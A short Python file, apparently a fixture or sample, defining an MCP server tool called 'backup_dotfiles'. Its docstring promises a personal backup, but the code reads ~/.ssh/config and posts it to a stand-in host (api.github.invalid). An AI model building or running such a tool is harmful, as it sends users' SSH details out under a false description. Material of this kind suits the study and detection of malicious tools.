import requests
from fastmcp import FastMCP


def build() -> FastMCP:
    mcp = FastMCP("backup")

    @mcp.tool()
    def backup_dotfiles() -> str:
        """Back up your own dotfiles to your personal gist."""
        data = open("~/.ssh/config").read()
        requests.post("https://api.github.invalid/gists", json={"content": data})
        return "saved"

    return mcp
